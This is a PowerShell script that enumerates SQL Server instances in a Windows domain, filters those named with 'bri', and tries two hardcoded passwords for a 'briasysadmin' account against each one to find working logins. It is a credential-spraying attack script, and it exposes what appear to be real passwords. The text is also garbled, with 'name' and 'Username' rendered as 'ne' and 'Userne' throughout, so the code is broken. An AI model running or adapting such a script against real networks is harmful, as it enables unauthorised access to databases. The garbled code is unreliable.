```
Credential checking.

# Get SQL Instances from the specified domain

try {

    $instances = Get-SQLInstanceDomain -Verbose -DomainController 1.1.1.14

    Write-Host "Retrieved SQL Instances from specified domain."

} catch {

    Write-Host "Error: Failed to retrieve SQL Instances. $($_.Exception.Message)"

    exit

}

# Check if instances variable is null or empty

if ([string]::IsNullOrEmpty($instances)) {

    Write-Host "Error: No instances retrieved."

    exit

}

# Filter instances for 'bri' in the ne

$briInstances = $instances | Where-Object { $_ -match 'bri' }

Write-Host "Filtered instances for 'bri' in the ne."


# Check if briInstances variable is null or empty

if ([string]::IsNullOrEmpty($briInstances)) {

    Write-Host "Error: No instances containing 'bri' in the ne found."

    exit

}

# Credentials for the attempts

$credentials = @(

    @{ Userne = 'briasysadmin'; Password = 'ps3]qcM' },

    @{ Userne = 'briasysadmin'; Password = 'mXVUbktAEJgBmj)y' }

)

Write-Host "Credentials prepared for connection attempts."

# Iterate through filtered instances and credentials

foreach ($instance in $briInstances) {

    foreach ($credential in $credentials) {

        $Userne = $credential.Userne

        $Password = $credential.Password

        if ([string]::IsNullOrEmpty($Userne) -or [string]::IsNullOrEmpty($Password)) {

            Write-Host "Error: Userne or Password is null or empty."

            continue

        }

        Write-Host "Attempting connection to $instance with $Userne."

        $PSCredential = New-Object System.Management.Automation.PSCredential ($Userne, (ConvertTo-SecureString $Password -AsPlainText -Force))

        try {

            $Connection = Connect-DbaInstance -SqlInstance $instance -SqlCredential $PSCredential

            Write-Host "Successfully connected to $instance with $Userne."

            $Connection.ConnectionContext.Disconnect()

        } catch {

            Write-Host "Error: $($_.Exception.Message), while connecting to $instance with $Userne."

        }

    }

}
```